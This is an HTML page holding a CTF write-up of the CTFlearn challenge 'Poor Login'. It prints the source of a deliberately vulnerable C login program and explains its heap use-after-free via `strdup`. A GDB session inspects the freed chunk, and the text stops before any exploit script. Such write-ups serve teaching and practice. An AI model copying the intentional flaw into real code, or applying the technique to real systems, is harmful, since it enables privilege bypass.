<!doctype html><html lang=es>
<head>
<title>Poor Login | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="We are given a 64-bit binary called login:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  We also have the C source code:
#include <stdlib.h> #include <stdio.h> #include <string.h> int menu() { printf(&#34;*** WINBLOWS LOGIN *********\n&#34; &#34;1. Login into user.\n&#34; &#34;2. Sign out.\n&#34; &#34;3. Print flag.\n&#34; &#34;4. Lock user.\n&#34; &#34;5. Restore user.\n&#34; &#34;> &#34;); int resp = 0; scanf(&#34;%d&#34;, &resp); while (getchar() != '\n'); return resp; } struct creds { void *padding; char name[32]; int admin; }; struct creds *curr; struct creds *save; char *fake_flag; int main() { char buff[64]; setbuf(stdout, NULL); setbuf(stdin, NULL); while (1) { switch (menu()) { case 1: // Login curr = malloc(sizeof(*curr)); printf(&#34;">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/pwn.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Poor Login">
<meta property="og:description" content="We are given a 64-bit binary called login:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  We also have the C source code:
#include <stdlib.h> #include <stdio.h> #include <string.h> int menu() { printf(&#34;*** WINBLOWS LOGIN *********\n&#34; &#34;1. Login into user.\n&#34; &#34;2. Sign out.\n&#34; &#34;3. Print flag.\n&#34; &#34;4. Lock user.\n&#34; &#34;5. Restore user.\n&#34; &#34;> &#34;); int resp = 0; scanf(&#34;%d&#34;, &resp); while (getchar() != '\n'); return resp; } struct creds { void *padding; char name[32]; int admin; }; struct creds *curr; struct creds *save; char *fake_flag; int main() { char buff[64]; setbuf(stdout, NULL); setbuf(stdin, NULL); while (1) { switch (menu()) { case 1: // Login curr = malloc(sizeof(*curr)); printf(&#34;">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/en/ctf/ctflearn/binary/poor-login/"><meta property="article:section" content="ctf">
<meta property="article:modified_time" content="2022-02-16T01:24:34+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/pwn.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Poor Login">
<meta itemprop=description content="We are given a 64-bit binary called login:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  We also have the C source code:
#include <stdlib.h> #include <stdio.h> #include <string.h> int menu() { printf(&#34;*** WINBLOWS LOGIN *********\n&#34; &#34;1. Login into user.\n&#34; &#34;2. Sign out.\n&#34; &#34;3. Print flag.\n&#34; &#34;4. Lock user.\n&#34; &#34;5. Restore user.\n&#34; &#34;> &#34;); int resp = 0; scanf(&#34;%d&#34;, &resp); while (getchar() != '\n'); return resp; } struct creds { void *padding; char name[32]; int admin; }; struct creds *curr; struct creds *save; char *fake_flag; int main() { char buff[64]; setbuf(stdout, NULL); setbuf(stdin, NULL); while (1) { switch (menu()) { case 1: // Login curr = malloc(sizeof(*curr)); printf(&#34;">
<meta itemprop=dateModified content="2022-02-16T01:24:34+01:00">
<meta itemprop=wordCount content="1508">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Poor Login">
<meta name=twitter:description content="We are given a 64-bit binary called login:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  We also have the C source code:
#include <stdlib.h> #include <stdio.h> #include <string.h> int menu() { printf(&#34;*** WINBLOWS LOGIN *********\n&#34; &#34;1. Login into user.\n&#34; &#34;2. Sign out.\n&#34; &#34;3. Print flag.\n&#34; &#34;4. Lock user.\n&#34; &#34;5. Restore user.\n&#34; &#34;> &#34;); int resp = 0; scanf(&#34;%d&#34;, &resp); while (getchar() != '\n'); return resp; } struct creds { void *padding; char name[32]; int admin; }; struct creds *curr; struct creds *save; char *fake_flag; int main() { char buff[64]; setbuf(stdout, NULL); setbuf(stdin, NULL); while (1) { switch (menu()) { case 1: // Login curr = malloc(sizeof(*curr)); printf(&#34;">
<meta name=twitter:image content="https://7rocky.github.io/images/pwn.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/ctf/ctflearn/binary/poor-login/ title=es>
<img alt=es height=32px src=/images/es.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">BINARY</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/ctflearn/binary/poor-login/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/ctflearn/binary/poor-login/&text=Poor%20Login" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/ctflearn/binary/poor-login/&title=Poor%20Login" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">Poor Login</h1>
<br>
</header>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>login</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
    RELRO:    <span class=code-dark-green>Full RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>  
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-green>PIE enabled</span>
</code></pre></div>
<p>We also have the C source code:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdlib.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;string.h&gt;</span>

<span class="mtk7 mtki">int</span> <span class=mtk8>menu</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"***</span> <span class=mtk4>WINBLOWS</span> <span class=mtk4>LOGIN</span> <span class=mtk4>*********</span><span class=mtk6>\n</span><span class=mtk4>"</span>
      <span class=mtk4>"1.</span> <span class=mtk4>Login</span> <span class=mtk4>into</span> <span class=mtk4>user.</span><span class=mtk6>\n</span><span class=mtk4>"</span>
      <span class=mtk4>"2.</span> <span class=mtk4>Sign</span> <span class=mtk4>out.</span><span class=mtk6>\n</span><span class=mtk4>"</span>
      <span class=mtk4>"3.</span> <span class=mtk4>Print</span> <span class=mtk4>flag.</span><span class=mtk6>\n</span><span class=mtk4>"</span>
      <span class=mtk4>"4.</span> <span class=mtk4>Lock</span> <span class=mtk4>user.</span><span class=mtk6>\n</span><span class=mtk4>"</span>
      <span class=mtk4>"5.</span> <span class=mtk4>Restore</span> <span class=mtk4>user.</span><span class=mtk6>\n</span><span class=mtk4>"</span>
      <span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>

  <span class="mtk7 mtki">int</span> <span class=mtk1>resp</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk8>scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>resp);</span>
  <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk8>getchar</span><span class=mtk1>()</span> <span class=mtk5>!=</span> <span class=mtk4>'</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>);</span>
  <span class=mtk5>return</span> <span class=mtk1>resp;</span>
<span class=mtk1>}</span>

<span class="mtk7 mtki">struct</span> <span class=mtk1>creds</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>padding;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>name[</span><span class=mtk6>32</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>admin;</span>
<span class=mtk1>};</span>

<span class="mtk7 mtki">struct</span> <span class=mtk1>creds</span> <span class=mtk5>*</span><span class=mtk1>curr;</span>
<span class="mtk7 mtki">struct</span> <span class=mtk1>creds</span> <span class=mtk5>*</span><span class=mtk1>save;</span>

<span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>fake_flag;</span>

<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>buff[</span><span class=mtk6>64</span><span class=mtk1>];</span>

  <span class=mtk8>setbuf</span><span class=mtk1>(stdout,</span> <span class=mtk6>NULL</span><span class=mtk1>);</span>
  <span class=mtk8>setbuf</span><span class=mtk1>(stdin,</span> <span class=mtk6>NULL</span><span class=mtk1>);</span>

  <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk5>switch</span> <span class=mtk1>(</span><span class=mtk8>menu</span><span class=mtk1>())</span> <span class=mtk1>{</span>
    <span class=mtk5>case</span> <span class=mtk6>1</span><span class=mtk1>:</span>  <span class=mtk3>//</span> <span class=mtk3>Login</span>
      <span class=mtk1>curr</span> <span class=mtk5>=</span> <span class=mtk8>malloc</span><span class=mtk1>(</span><span class=mtk5>sizeof</span><span class=mtk1>(</span><span class=mtk5>*</span><span class=mtk1>curr));</span>

      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Username:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
      <span class=mtk8>fgets</span><span class=mtk1>(curr</span><span class=mtk5>-&gt;</span><span class=mtk1>name</span><span class=mtk1>,</span> <span class=mtk5>sizeof</span><span class=mtk1>(curr</span><span class=mtk5>-&gt;</span><span class=mtk1>name),</span> <span class=mtk1>stdin);</span>
      <span class=mtk8>strtok</span><span class=mtk1>(curr</span><span class=mtk5>-&gt;</span><span class=mtk1>name</span><span class=mtk1>,</span> <span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>);</span>

      <span class=mtk1>curr-&gt;admin</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
      <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk5>case</span> <span class=mtk6>2</span><span class=mtk1>:</span> <span class=mtk3>//</span> <span class=mtk3>Sign</span> <span class=mtk3>out</span>
      <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk1>curr)</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"You</span> <span class=mtk4>are</span> <span class=mtk4>not</span> <span class=mtk4>logged</span> <span class=mtk4>in!"</span><span class=mtk1>);</span>
        <span class=mtk5>break</span><span class=mtk1>;</span>
      <span class=mtk1>}</span>
      <span class=mtk8>free</span><span class=mtk1>(curr);</span>
      <span class=mtk1>curr</span> <span class=mtk5>=</span> <span class=mtk6>NULL</span><span class=mtk1>;</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"You</span> <span class=mtk4>have</span> <span class=mtk4>been</span> <span class=mtk4>successfully</span> <span class=mtk4>logged</span> <span class=mtk4>out."</span><span class=mtk1>);</span>
      <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk5>case</span> <span class=mtk6>3</span><span class=mtk1>:</span> <span class=mtk3>//</span> <span class=mtk3>Print</span> <span class=mtk3>flag</span>
      <span class=mtk5>if</span> <span class=mtk1>(curr</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>curr</span><span class=mtk5>-&gt;</span><span class=mtk1>admin)</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Here's</span> <span class=mtk4>your</span> <span class=mtk4>flag:"</span><span class=mtk1>);</span>
        <span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk4>"/bin/cat</span> <span class=mtk4>/flag.txt"</span><span class=mtk1>);</span>
      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
        <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk1>fake_flag)</span> <span class=mtk1>{</span>
          <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"You</span> <span class=mtk4>are</span> <span class=mtk4>not</span> <span class=mtk4>admin.</span> <span class=mtk4>Would</span> <span class=mtk4>you</span> <span class=mtk4>like</span> <span class=mtk4>to</span> <span class=mtk4>create</span> <span class=mtk4>a</span> <span class=mtk4>new</span> <span class=mtk4>flag</span> <span class=mtk4>instead?"</span><span class=mtk1>);</span>  
          <span class=mtk8>fgets</span><span class=mtk1>(buff,</span> <span class=mtk5>sizeof</span><span class=mtk1>(buff),</span> <span class=mtk1>stdin);</span>
          <span class=mtk1>fake_flag</span> <span class=mtk5>=</span> <span class=mtk8>strdup</span><span class=mtk1>(buff);</span>
        <span class=mtk1>}</span>
        <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Here's</span> <span class=mtk4>your</span> <span class=mtk4>flag:</span> <span class=mtk6>%s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>fake_flag);</span>
      <span class=mtk1>}</span>
      <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk5>case</span> <span class=mtk6>4</span><span class=mtk1>:</span> <span class=mtk3>//</span> <span class=mtk3>Lock</span> <span class=mtk3>user</span>
      <span class=mtk5>if</span> <span class=mtk1>(curr</span> <span class=mtk5>==</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"You</span> <span class=mtk4>are</span> <span class=mtk4>not</span> <span class=mtk4>logged</span> <span class=mtk4>in!"</span><span class=mtk1>);</span>
        <span class=mtk5>break</span><span class=mtk1>;</span>
      <span class=mtk1>}</span>

      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"User</span> <span class=mtk4>has</span> <span class=mtk4>been</span> <span class=mtk4>locked</span> <span class=mtk4>now."</span><span class=mtk1>);</span>
      <span class=mtk1>save</span> <span class=mtk5>=</span> <span class=mtk1>curr;</span>
      <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk5>case</span> <span class=mtk6>5</span><span class=mtk1>:</span> <span class=mtk3>//</span> <span class=mtk3>Restore</span> <span class=mtk3>user</span>
      <span class=mtk5>if</span> <span class=mtk1>(curr</span> <span class=mtk5>!=</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"You</span> <span class=mtk4>are</span> <span class=mtk4>already</span> <span class=mtk4>logged.</span> <span class=mtk4>Sign</span> <span class=mtk4>out</span> <span class=mtk4>first!"</span><span class=mtk1>);</span>
      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk5>if</span> <span class=mtk1>(save</span> <span class=mtk5>==</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"No</span> <span class=mtk4>user</span> <span class=mtk4>is</span> <span class=mtk4>currently</span> <span class=mtk4>locked!"</span><span class=mtk1>);</span>
      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
        <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Welcome</span> <span class=mtk4>back,</span> <span class=mtk6>%s</span><span class=mtk4>!</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>save-&gt;name);</span>
        <span class=mtk1>curr</span> <span class=mtk5>=</span> <span class=mtk1>save;</span>
        <span class=mtk1>save</span> <span class=mtk5>=</span> <span class=mtk6>NULL</span><span class=mtk1>;</span>
      <span class=mtk1>}</span>
      <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk5>default</span><span class=mtk1>:</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid choice"</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
  <span class=mtk1>}</span>
<span class=mtk1>}</span>
</code></pre></div>
<p>The program has five options:</p>
<ol>
<li>Login as a new user</li>
<li>Log out</li>
<li>Print the flag or enter a fake flag</li>
<li>Backup a user</li>
<li>Restore backup</li>
</ol>
<p>Some key things about the program:</p>
<ul>
<li>Users are stored on the heap because it is using <code>malloc</code></li>
<li>There are two pointers to a <code>struct cred</code>, which are: <code>curr</code> and <code>save</code></li>
<li>If we log out (2), then <code>curr</code> will be released using <code>free</code> and set to <code>NULL</code></li>
<li>If we print the flag (3) and we are not <code>admin</code>, then we can enter a <code>fake_flag</code> that will be saved using <code>strdup</code></li>
<li>If we print the flag (3) and we are <code>admin</code>, we get the real flag</li>
<li>We can backup a user stored in <code>curr</code> into <code>save</code> if we are authenticated</li>
<li>We can restore a user from <code>save</code> to <code>curr</code> if we are not authenticated</li>
</ul>
<p>This program is vulnerable to Use After Free, which consists of releasing an object on the heap and use it again after.</p>
<p>Remember that <code>free</code> does not remove the data from the heap, it just marks the chunk as unused.</p>
<p>The Use After Free vulnerability cames from the use of <code>strdup</code> after realising the <code>curr</code> pointer. The function <code>strdup</code> allocates a string on the heap using <code>malloc</code> with an amount of bytes equal to the length of the string. The behaviour of <code>malloc</code> is to allocate a certain amount of bytes on the heap, however, this process can be faster if <code>malloc</code> is able to reuse a recently released chunk. Hence, if we release <code>curr</code> and then enter a string for <code>strdup</code> with the same size as the chunk for <code>curr</code> had, the string will be stored there.</p>
<p>Let&rsquo;s visualize it in GDB. First, we login (1):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q login
Reading symbols from <span class=code-dark-green>login</span>...
(No debugging symbols found in <span class=code-dark-green>login</span>)
<span class=code-red>gef➤</span>  break menu
Breakpoint 1 at <span class=code-dark-blue>0xa1e</span>
<span class=code-red>gef➤</span>  run
Starting program: ./login

Breakpoint 1, <span class=code-dark-blue>0x0000555555400a1e</span> in <span class=code-dark-yellow>menu</span> ()  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 1
Username: AAAABBBBCCCC

Breakpoint 1, <span class=code-dark-blue>0x0000555555400a1e</span> in <span class=code-dark-yellow>menu</span> ()  
</code></pre></div>
<p>Now we can easily find this username in memory:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  grep AAAABBBBCCCC
<span class=code-blue>[+]</span> Searching '<span class=code-dark-yellow>AAAABBBBCCCC</span>' in memory
<span class=code-green>[+]</span> In '<span class=code-dark-blue>[heap]</span>'(0x555555603000-0x555555624000), permission=rw-
  0x5555556032a8 - 0x5555556032b4  →   "<span class=code-dark-magenta>AAAABBBBCCCC</span>"
<span class=code-green>gef➤</span>  x/20x 0x555555603290
<span class=code-dark-blue>0x555555603290</span>: 0x00000000      0x00000000      0x00000041      0x00000000  
<span class=code-dark-blue>0x5555556032a0</span>: 0x00000000      0x00000000      0x41414141      0x42424242
<span class=code-dark-blue>0x5555556032b0</span>: 0x43434343      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032c0</span>: 0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032d0</span>: 0x00000000      0x00000000      0x00020d31      0x00000000
